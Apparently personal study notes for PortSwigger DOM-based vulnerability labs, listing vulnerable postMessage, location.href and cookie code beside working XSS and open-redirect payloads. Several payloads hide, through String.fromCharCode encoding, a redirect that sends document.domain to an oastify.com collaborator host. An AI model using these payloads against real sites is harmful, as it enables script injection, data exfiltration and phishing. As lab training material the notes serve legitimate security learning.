<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>DOM</title>
  <link rel="stylesheet" href="/static/style.css">

</head>
<body>
<header id="title-block-header">
</header>
<h1 id="dom-based-vulnerabilities">DOM-based Vulnerabilities</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><p><a href="#recon">Recon for DOM-based Vulnerabilities</a></p></li>
<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
Payloads</a></p></li>
</ul>
<p><br></p>
<h2 id="resources">Resources</h2>
<ul>
<li><p>https://portswigger.net/web-security/dom-based</p></li>
<li><p>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting</p></li>
<li><p>https://owasp.org/www-community/attacks/DOM_Based_XSS</p></li>
<li><p>Cyber Chef - https://gchq.github.io/CyberChef/</p></li>
<li><p>Cheat Sheets:</p></li>
<li><p>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p></li>
<li><p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</p></li>
<li><p>DOM Invader:
https://portswigger.net/burp/documentation/desktop/tools/dom-invader</p></li>
</ul>
<p><br></p>
<h2 id="recon">Recon</h2>
<h3 id="identify-dom-based-vulnerabilities">Identify DOM-based
Vulnerabilities</h3>
<ul>
<li><p>DOM XSS happens when client-side JavaScript takes
user-controllable input (source) and includes it into a dangerous
function (sink).</p></li>
<li><p>Use the Browser’s Developers Tool and go to the Sources/Debugger
tab. In every page we can search for the keyword “script”, and we can
also search through all the JavaScript files.</p></li>
<li><p>In these files/pages, we can search for any
<strong>user-controllable sources</strong> and <strong>dangerous
sinks</strong> that the JavaScript is using.</p></li>
<li><p>Analyze if JavaScript is taking any sources and including them
into dangerous sinks.</p></li>
<li><p>Search all static JavaScript files too.</p></li>
<li><p>The labs in this document and in the <a
href="#https://portswigger.net/web-security/cross-site-scripting/dom-based">Cross-site
Scripting/DOM XSS</a> section, include examples of user-controllable
sources being used in dangerous sinks.</p></li>
</ul>
<p><br></p>
<h3 id="common-sources-and-sinks">Common Sources and Sinks</h3>
<ul>
<li><p>https://portswigger.net/web-security/dom-based#common-sources</p></li>
<li><p>https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities</p></li>
</ul>
<p><br></p>
<p><br></p>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<p><br><br></p>
<ul>
<li>Find more examples of exploit payloads in the XSS folder.</li>
</ul>
<p><br></p>
<h3 id="source---web-messages">Source - Web Messages</h3>
<ul>
<li><p>Use web messages as a source to send malicious data to a target
window that will take in that data and include it in a dangerous
sink.</p>
<ul>
<li><p>Example: window.postMessage(“&lt;img src=x
onerror=alert(1)&gt;”)</p></li>
<li><p>Payload: (Insert this payload onto the Exploit Server.)</p></li>
</ul></li>
</ul>
<div class="sourceCode" id="cb1"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION.net/&quot;</span><span class="ot"> onload</span><span class="op">=</span><span class="st">&quot;this.contentWindow.postMessage(&#39;</span><span class="er">&lt;</span><span class="st">img src=1 onerror=print()&gt;&#39;,&#39;*&#39;)&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<ul>
<li><strong>Vulnerable Code:</strong></li>
</ul>
<div class="sourceCode" id="cb2"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="bu">window</span><span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&#39;message&#39;</span><span class="op">,</span> <span class="kw">function</span>(e) {</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;ads&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> e<span class="op">.</span><span class="at">data</span><span class="op">;</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>})</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
<p><br></p>
<ul>
<li><p>Exploitation Payload: (Use document.location to exfiltrate data,
and encode the payload to bypass filters.)</p>
<ul>
<li><p>Decoded Payload:</p>
<ul>
<li><p>The below payload can be used to test in the Browser’s Dev Tools
console:</p></li>
<li><p>The String.fromCharCode() contains the following:</p>
<ul>
<li><p>document.location = “https://mh7yjmia7.oastify.com/?x=” +
document.domain + “END”</p></li>
<li><p>Note: Use CyberChef to encode the data. “To Decimal” -&gt;
Delimiter “Comma”. (Also the alert() was not needed here just used for
testing)</p></li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<div class="sourceCode" id="cb3"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">postMessage</span>(<span class="st">&#39;&lt;img src=x onerror=alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,109,104,55,121,106,109,105,97,55,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)))&gt;&#39;</span>)</span></code></pre></div>
<ul>
<li>Final Payload: (Use in the Exploit Server.)</li>
</ul>
<div class="sourceCode" id="cb4"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>iframe src<span class="op">=</span><span class="st">&quot;https://0a41005003b5365e82996bf000200091.web-security-academy.net/&quot;</span> onload<span class="op">=</span><span class="st">&quot;this.contentWindow.postMessage(&#39;&lt;img src=x onerror=alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,109,104,55,121,106,109,105,97,55,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)))&gt;&#39;,&#39;*&#39;)&quot;</span><span class="op">&gt;</span></span></code></pre></div>
<p><br><br><br></p>
<h3 id="source---web-messages-location.href">Source - Web Messages
location.href()</h3>
<ul>
<li><p>Use web messages as a source to send malicious data to a target
window that will take in that data and include it in a dangerous sink.
Example, the code will place the user-controllable input into the
location.href sink, if the message contains the String “http:”.</p>
<ul>
<li>Example Payload (This can be used in the Browser’s Console to
test.):</li>
</ul>
<div class="sourceCode" id="cb5"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>  <span class="bu">window</span><span class="op">.</span><span class="fu">postMessage</span>(“javascript<span class="op">:</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="co">//http:”)</span></span></code></pre></div>
<ul>
<li>Payload:</li>
</ul></li>
</ul>
<div class="sourceCode" id="cb6"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION.net/&quot;</span><span class="ot"> onload</span><span class="op">=</span><span class="st">&quot;this.contentWindow.postMessage(&#39;javascript:print()//http:&#39;,&#39;*&#39;)&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<ul>
<li><strong>Vulnerable Code:</strong></li>
</ul>
<div class="sourceCode" id="cb7"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="bu">window</span><span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&#39;message&#39;</span><span class="op">,</span> <span class="kw">function</span>(e) {</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> url <span class="op">=</span> e<span class="op">.</span><span class="at">data</span><span class="op">;</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (url<span class="op">.</span><span class="fu">indexOf</span>(<span class="st">&#39;http:&#39;</span>) <span class="op">&gt;</span> <span class="op">-</span><span class="dv">1</span> <span class="op">||</span> url<span class="op">.</span><span class="fu">indexOf</span>(<span class="st">&#39;https:&#39;</span>) <span class="op">&gt;</span> <span class="op">-</span><span class="dv">1</span>) {</span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>        location<span class="op">.</span><span class="at">href</span> <span class="op">=</span> url<span class="op">;</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    }</span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>}<span class="op">,</span> <span class="kw">false</span>)<span class="op">;</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
<p><br></p>
<ul>
<li><p>Exploitation Payload: (Use document.location to exfiltrate data
and encode the payload to bypass filters.)</p></li>
<li><p>This payload can be used in the Browser’s Console to test. (The
pseudo javascript protocol is used here as the data is inserted in
href.)</p></li>
</ul>
<div class="sourceCode" id="cb8"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">postMessage</span>(<span class="st">&#39;javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,102,52,107,51,49,118,108,99,57,103,120,53,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))//http:&#39;</span>)</span></code></pre></div>
<p>Final Payload: (Use this in Exploit Server)</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>iframe src<span class="op">=</span><span class="st">&quot;https://0ac6000c045b941d800f44e400e9009d.web-security-academy.net/&quot;</span> onload<span class="op">=</span><span class="st">&quot;this.contentWindow.postMessage(&#39;javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,98,114,54,122,119,122,110,110,99,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))//http:&#39;,&#39;*&#39;)&quot;</span><span class="op">&gt;</span></span></code></pre></div>
<p><br><br><br></p>
<h3 id="source---web-messages-json.parse">Source - Web Messages
JSON.parse()</h3>
<ul>
<li><p>There is a client-side script on the application that has an
event listener that is listening for a web message. It is possible to
submit crafted input which will be included in the “src” attribute of an
&lt;iframe&gt;. This is essentially the “location.href” sink. We can use
a JavaScript pseudo-protocol payload here – javascript:print()</p>
<ul>
<li>Payload:</li>
</ul></li>
</ul>
<div class="sourceCode" id="cb10"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">https://VULNERABLE-APPLICATION.net/</span><span class="ot"> onload</span><span class="op">=</span><span class="st">&#39;this.contentWindow.postMessage(&quot;{\&quot;type\&quot;:\&quot;load-channel\&quot;,\&quot;url\&quot;:\&quot;javascript:print()\&quot;}&quot;,&quot;*&quot;)&#39;</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<ul>
<li><strong>Vulnerable Code:</strong></li>
</ul>
<div class="sourceCode" id="cb11"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="bu">window</span><span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&#39;message&#39;</span><span class="op">,</span> <span class="kw">function</span>(e) {</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> iframe <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">createElement</span>(<span class="st">&#39;iframe&#39;</span>)<span class="op">,</span> ACMEplayer <span class="op">=</span> {<span class="dt">element</span><span class="op">:</span> iframe}<span class="op">,</span> d<span class="op">;</span></span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="fu">appendChild</span>(iframe)<span class="op">;</span></span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span> {</span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>        d <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">parse</span>(e<span class="op">.</span><span class="at">data</span>)<span class="op">;</span></span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">catch</span>(e) {</span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span><span class="op">;</span></span>
<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>    }</span>
<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">switch</span>(d<span class="op">.</span><span class="at">type</span>) {</span>
<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="st">&quot;page-load&quot;</span><span class="op">:</span></span>
<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>            ACMEplayer<span class="op">.</span><span class="at">element</span><span class="op">.</span><span class="fu">scrollIntoView</span>()<span class="op">;</span></span>
<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="st">&quot;load-channel&quot;</span><span class="op">:</span></span>
<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>            ACMEplayer<span class="op">.</span><span class="at">element</span><span class="op">.</span><span class="at">src</span> <span class="op">=</span> d<span class="op">.</span><span class="at">url</span><span class="op">;</span></span>
<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>        <span class="cf">case</span> <span class="st">&quot;player-height-changed&quot;</span><span class="op">:</span></span>
<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>            ACMEplayer<span class="op">.</span><span class="at">element</span><span class="op">.</span><span class="at">style</span><span class="op">.</span><span class="at">width</span> <span class="op">=</span> d<span class="op">.</span><span class="at">width</span> <span class="op">+</span> <span class="st">&quot;px&quot;</span><span class="op">;</span></span>
<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>            ACMEplayer<span class="op">.</span><span class="at">element</span><span class="op">.</span><span class="at">style</span><span class="op">.</span><span class="at">height</span> <span class="op">=</span> d<span class="op">.</span><span class="at">height</span> <span class="op">+</span> <span class="st">&quot;px&quot;</span><span class="op">;</span></span>
<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a>    }</span>
<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a>}<span class="op">,</span> <span class="kw">false</span>)<span class="op">;</span></span>
<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
<p><br></p>
<p>Exploitation Payload: (Similar as the above payloads for Web
Messages.) Check out the XSS folder of the cheatsheet for more
payloads.</p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>iframe src<span class="op">=</span>https<span class="op">:</span><span class="co">//0ab400b604252be5803512fc002b00ad.web-security-academy.net/ onload=&#39;this.contentWindow.postMessage(&quot;{\&quot;type\&quot;:\&quot;load-channel\&quot;,\&quot;url\&quot;:\&quot;javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,112,99,53,100,118,116,109,104,100,97,49,122,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))\&quot;}&quot;,&quot;*&quot;)&#39;&gt;</span></span></code></pre></div>
<p><br></br><br></p>
<h3 id="dom-xss---open-redirection">DOM XSS - Open Redirection</h3>
<ul>
<li><p>There was a client-side script on the application that is taking
in a query parameter called “url” and using the value in a location.href
sink. The URL needs to begin with “https://”.</p></li>
<li><p>The JavaScript Pseudo-protocol will not work here in this case,
because we don’t control the beginning of the href value. This will
simply redirect a user to a different website, can be used for
phishing.</p>
<ul>
<li><p>Example:
httpss://VULNERABLE-APPLICATION.net/post?postId=4&amp;url=httpss://<em>user-input</em></p></li>
<li><p>Payload:</p></li>
</ul></li>
</ul>
<pre><code>https://VULNERABLE-APPLICATION.net/post?postId=4&amp;url=https://ATTACKER-SERVER</code></pre>
<p><br></p>
<ul>
<li><strong>Vulnerable Code:</strong></li>
</ul>
<div class="sourceCode" id="cb14"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">&#39;#&#39;</span><span class="ot"> onclick</span><span class="op">=</span><span class="st">&#39;returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = &quot;/&quot;&#39;</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></br><br></p>
<h3 id="dom-xss---cookie-manipulation">DOM XSS - Cookie
Manipulation</h3>
<ul>
<li><p>The “window.location” source is being appended to a Cookie using
the “document.cookie”. This Cookie value is reflected back in the
application’s response within an HTML attribute. Submit a crafted URL
that will break out of the HTML context and execute JavaScript code.</p>
<ul>
<li><p>Example (Context): &lt;a
href=‘httpss://VULNERABLE-APP.net/product?productId=<em>user-input</em>’&gt;</p></li>
<li><p>Payload: &amp;’&gt;&lt;script&gt;print()&lt;/script&gt;</p></li>
</ul>
<p><strong>Note: Need to use the &amp; in the URL symbol to inject valid
payload, since the application will throw an error if the “productId” is
not valid.</strong></p></li>
<li><p>The iframe will first load the vulnerable URL, which will store
it in “window.location” source. Then the onload event will redirect to
another page on the application, which will trigger the javascript, as
the URL is reflected in the response.</p></li>
<li><p>Final Payload: (Use in Exploit Server.)</p></li>
</ul>
<div class="sourceCode" id="cb15"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APP.net/product?productId=1</span><span class="er">&amp;</span><span class="st">&#39;&gt;</span><span class="er">&lt;</span><span class="st">script&gt;print()</span><span class="er">&lt;</span><span class="st">/script&gt;&quot;</span><span class="ot"> onload</span><span class="op">=</span><span class="st">&quot;if(!window.x)this.src=&#39;https://VULNERABLE-APP.net&#39;;window.x=1;&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<ul>
<li><strong>Vulnerable Code:</strong></li>
</ul>
<div class="sourceCode" id="cb16"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>   <span class="bu">document</span><span class="op">.</span><span class="at">cookie</span> <span class="op">=</span> <span class="st">&#39;lastViewedProduct=&#39;</span> <span class="op">+</span> <span class="bu">window</span><span class="op">.</span><span class="at">location</span> <span class="op">+</span> <span class="st">&#39;; SameSite=None; Secure&#39;</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
<p><br></p>
<ul>
<li>Exploitation Payload: (Use in Exploit Server.) (Payload is similar
to the above mentions.)</li>
</ul>
<div class="sourceCode" id="cb17"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>iframe src<span class="op">=</span><span class="st">&quot;https://0ac0003e03b1155582af4721003c00da.web-security-academy.net/product?productId=1&amp;&#39;&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,100,101,118,49,98,116,104,49,100,112,50,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34))&lt;/script&gt;&quot;</span> onload<span class="op">=</span><span class="st">&quot;if(!window.x)this.src=&#39;https://0ac0003e03b1155582af4721003c00da.web-security-academy.net&#39;;window.x=1;&quot;</span><span class="op">&gt;</span></span></code></pre></div>
<p><br><br><br></p>
<h3
id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
to complete labs that are missing from cheat sheet:</h3>
<ul>
<li><p>LAB EXPERT Exploiting DOM clobbering to enable XSS</p></li>
<li><p>LAB EXPERT Clobbering DOM attributes to bypass HTML
filters</p></li>
</ul>
</body>
</html>
